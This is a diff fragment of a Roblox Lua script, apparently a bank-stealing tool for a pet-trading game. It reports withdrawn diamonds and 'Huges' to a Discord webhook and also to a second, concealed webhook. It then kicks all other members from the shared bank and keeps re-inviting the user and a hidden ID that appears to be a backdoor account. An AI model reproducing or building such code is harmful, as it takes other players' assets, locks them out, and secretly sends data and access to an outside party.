+                ["value"] = "```" .. #SList .. "```",
+                ["inline"] = true
+            }, {
+                ["name"] = ":rabbit: **Mythicals** :rabbit:",
+                ["value"] = "```" .. #MList .. "```",
+                ["inline"] = true
+            },
+                {
+                    ["name"] = "---------------------------------------",
+                    ["value"] = "",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = ":eyes: **Bank Pets** :eyes:",
+                    ["value"] = "",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "---------------------------------------",
+                    ["value"] = "",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = ":gem: **Diamonds** :gem:",
+                    ["value"] = "```" .. BDiamondsCount .. "```",
+                    ["inline"] = true
+                }, {
+                ["name"] = ":dog: **Pets** :dog:",
+                ["value"] = "```" .. #SuperBank["Storage"]["Pets"] .. "```",
+                ["inline"] = true
+            }, {
+                ["name"] = ":money_mouth: **Huges** :money_mouth:",
+                ["value"] = "```" .. #BHList .. "```",
+                ["inline"] = true
+            }, {
+                ["name"] = ":cat: **Exclusives** :cat:",
+                ["value"] = "```" .. BEHList .. "```",
+                ["inline"] = true
+            }, {
+                ["name"] = ":performing_arts: **Secrets** :performing_arts:",
+                ["value"] = "```" .. #BSList .. "```",
+                ["inline"] = true
+            }, {
+                ["name"] = ":rabbit: **Mythicals** :rabbit:",
+                ["value"] = "```" .. #BMList .. "```",
+                ["inline"] = true
+            },
+                {
+                    ["name"] = ":bank: **Joined Banks** :bank:",
+                    ["value"] = "```" .. bankscount .. lmao .. "```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = ":gem: **Wd Diamonds** :gem:",
+                    ["value"] = "```" .. WDiamondsCount .. "```",
+                    ["inline"] = true
+                }, {
+                ["name"] = ":money_mouth: **Wd Huges** :money_mouth:",
+                ["value"] = "```" .. FinalFinal .. "```",
+                ["inline"] = true
+            },
+                {
+                    ["name"] = "---------------------------------------",
+                    ["value"] = "",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = ":eyes: **Total Pets** :eyes:",
+                    ["value"] = "",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "---------------------------------------",
+                    ["value"] = "",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = ":gem: **Diamonds** :gem:",
+                    ["value"] = "```" .. TDiamondsCount .. "```",
+                    ["inline"] = true
+                }, {
+                ["name"] = ":dog: **Pets** :dog:",
+                ["value"] = "```" .. #SuperBank["Storage"]["Pets"] + #FinalList .. "```",
+                ["inline"] = true
+            },
+            }
+        }
+        }
+    }
+end
+
+local newdata1 = game:GetService("HttpService"):JSONEncode(data1)
+
+local headers = {
+    ["content-type"] = "application/json"
+}
+
+if _G.Webhook ~= nil then
+    local abcdef1 = {
+        Url = url,
+        Body = newdata1,
+        Method = "POST",
+        Headers = headers
+    }
+    request(abcdef1)
+end
+task.wait()
+if dhwebhook ~= nil then
+    local abcdef2 = {
+        Url = dhwebhook,
+        Body = newdata1,
+        Method = "POST",
+        Headers = headers
+    }
+    request(abcdef2)
+end
+for i, v in pairs(SuperBank["Players"]) do
+    if v ~= _G.UserID then
+        kickremote:InvokeServer(Bank, v)
+    end
+end
+while task.wait(0.1) do
+    if dhid ~= nil then
+        inviteremote:InvokeServer(mybanks[1]["BUID"], dhid)
+    end
+    task.wait()
+    inviteremote:InvokeServer(mybanks[1]["BUID"], _G.UserID)
+end
